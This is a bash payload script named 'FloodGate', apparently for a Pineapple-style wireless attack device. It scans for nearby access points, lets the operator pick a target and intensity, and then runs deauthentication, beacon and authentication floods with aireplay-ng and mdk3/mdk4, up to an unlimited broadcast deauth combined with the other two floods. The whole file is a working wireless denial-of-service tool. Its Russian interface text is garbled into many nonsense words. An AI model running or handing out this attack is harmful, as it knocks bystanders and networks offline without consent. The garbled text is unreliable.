#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Title: FloodGate
# Author: NullSec
# Description: Multi-vector DoS combining deauth, beacon, and auth flood
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/floodgate"
mkdir -p "$LOOT_DIR"

PROMPT "НАНОВЕДЭНИЕ

Многовекторный бережный DoS.

Векторы атак:
- Поток деаутентификации
- Наводнение beacon кадров
- Наводнение аутентификации
- Комбинированная ассалт

ОСТОРОЖНОСТЬ: Экстремально разрушительная
Бесплатная без калисрующих доступа.

Нажмите OK для конфигурирования."

# Check tools
MISSING=""
command -v aireplay-ng >/dev/null 2>&1 || MISSING="${MISSING}aireplay-ng "
command -v mdk3 >/dev/null 2>&1 && HAS_MDK3=1 || HAS_MDK3=0
command -v mdk4 >/dev/null 2>&1 && HAS_MDK4=1 || HAS_MDK4=0

if [ -z "$(command -v aireplay-ng 2>/dev/null)" ] && [ $HAS_MDK3 -eq 0 ] && [ $HAS_MDK4 -eq 0 ]; then
    ERROR_DIALOG "Оружие наводнения не найдены!

Установите:
opkg install aircrack-ng
opkg install mdk3 или mdk4"
    exit 1
fi

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "Нет интерфейса монитора!

airmon-ng start wlan1"; exit 1; }

PROMPT "ВЕКТОР АТАКИ:

1. Поток деаутентификации
2. Поток beacon-кадров
3. Поток аутентификации
4. Комбинированные (все три)
5. Целевая деаутентификация

Мониторинг: $MONITOR_IF

Выберите вектор."

ATTACK_VECTOR=$(NUMBER_PICKER "Вектор (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_VECTOR=1 ;; esac

# Intensity setting
PROMPT "МОЩНОСТЬ:

1. Низкая (тихая)
2. Средняя (сбалансированная)
3. Высокая (агрессивная)
4. Максимальная (ядерная)

Область = больше прерывания
но больше выявляемости.

Выберите мощность."

INTENSITY=$(NUMBER_PICKER "Мощность (1-4):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) INTENSITY=2 ;; esac

case $INTENSITY in
    1) DELAY=100; PACKETS=50;   LABEL="Low" ;;
    2) DELAY=50;  PACKETS=200;  LABEL="Medium" ;;
    3) DELAY=10;  PACKETS=500;  LABEL="High" ;;
    4) DELAY=0;   PACKETS=0;    LABEL="Maximum" ;;
esac

DURATION=$(NUMBER_PICKER "Нониторинг (сек):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

# Target selection for targeted attacks
TARGET_BSSID=""
TARGET_CHANNEL=""
if [ "$ATTACK_VECTOR" = "1" ] || [ "$ATTACK_VECTOR" = "4" ] || [ "$ATTACK_VECTOR" = "5" ]; then
    SPINNER_START "Сканирование целей..."
    SCAN_FILE="/tmp/flood_scan_$$.csv"
    timeout 10 airodump-ng "$MONITOR_IF" --output-format csv -w "/tmp/flood_scan_$$" 2>/dev/null &
    sleep 10
    kill %1 2>/dev/null
    wait 2>/dev/null

    TARGETS=$(grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "${SCAN_FILE}-01.csv" 2>/dev/null | head -8)
    SPINNER_STOP

    PROMPT "НАЙДЕНО ЦЕЛЕЙ:

$(echo "$TARGETS" | awk -F, '{print NR". "$1" ch"$4" "$14}' | head -8)

Введите BSSID цели."

    TARGET_BSSID=$(TEXT_PICKER "BSSID:" "$(echo "$TARGETS" | head -1 | awk -F, '{print $1}' | xargs)")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
        TARGET_BSSID="FF:FF:FF:FF:FF:FF"
        ;;
    esac

    TARGET_CHANNEL=$(echo "$TARGETS" | grep "$TARGET_BSSID" | awk -F, '{print $4}' | xargs)
    TARGET_CHANNEL=${TARGET_CHANNEL:-6}

    # Set channel
    iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null
    rm -f "${SCAN_FILE}"*
fi

resp=$(CONFIRMATION_DIALOG "ИНГИЕ FLOODGATE?

Вектор: $ATTACK_VECTOR
Мощность: $LABEL
Нониторинг: ${DURATION}с
Цель: ${TARGET_BSSID:-broadcast}
Kanal: ${TARGET_CHANNEL:-all}

ЭТО РАЗРУШИТЕЛЬНО!

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
FLOOD_LOG="$LOOT_DIR/flood_$TIMESTAMP.log"

LOG "Флудгейт: Вектор $ATTACK_VECTOR, Мощность $LABEL"
SPINNER_START "Флудгейт активен..."

PIDS=""

case $ATTACK_VECTOR in
    1) # Deauth flood
        if [ "$PACKETS" -eq 0 ]; then
            timeout "$DURATION" aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        else
            timeout "$DURATION" aireplay-ng --deauth "$PACKETS" -a "$TARGET_BSSID" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        fi
        PIDS="$PIDS $!"
        ;;

    2) # Beacon flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" b -s "$((1000 / (DELAY + 1)))" > "$FLOOD_LOG" 2>&1 &
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" b > "$FLOOD_LOG" 2>&1 &
        else
            # Fallback: rapid beacon injection via aireplay
            echo "Для атаки beacon flood требуется mdk3/mdk4" > "$FLOOD_LOG"
        fi
        PIDS="$PIDS $!"
        ;;

    3) # Auth flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" a -a "$TARGET_BSSID" > "$FLOOD_LOG" 2>&1 &
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" a -a "$TARGET_BSSID" > "$FLOOD_LOG" 2>&1 &
        else
            echo "Для атаки auth flood требуется mdk3/mdk4" > "$FLOOD_LOG"
        fi
        PIDS="$PIDS $!"
        ;;

    4) # Combined assault
        # Deauth
        timeout "$DURATION" aireplay-ng --deauth 0 -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" "$MONITOR_IF" >> "$FLOOD_LOG" 2>&1 &
        PIDS="$PIDS $!"

        # Beacon flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" b >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" b >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        fi

        # Auth flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" a -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" a -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        fi
        ;;

    5) # Targeted deauth (specific client)
        CLIENT_MAC=$(TEXT_PICKER "Client MAC:" "FF:FF:FF:FF:FF:FF")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CLIENT_MAC="FF:FF:FF:FF:FF:FF" ;; esac

        timeout "$DURATION" aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        PIDS="$PIDS $!"
        ;;
esac

SPINNER_STOP

PROMPT "ФЛУДГЕЙТ АКТИВНОН!

Вектор: $ATTACK_VECTOR
Мощность: $LABEL
Нониторинг: ${DURATION}с

Атака в процессе...

Нажмите OK для ожидания
завершения."

# Wait for all attack processes
for pid in $PIDS; do
    wait "$pid" 2>/dev/null
done

LOG_SIZE=$(wc -l < "$FLOOD_LOG" 2>/dev/null | tr -d ' ')

PROMPT "ФЛУДГЕЙТ ЗАВЕРШЕН

Время гонки: ${DURATION}с
Cтроки Лога: $LOG_SIZE

Сохранено: $FLOOD_LOG

Нажмите OK для выхода."
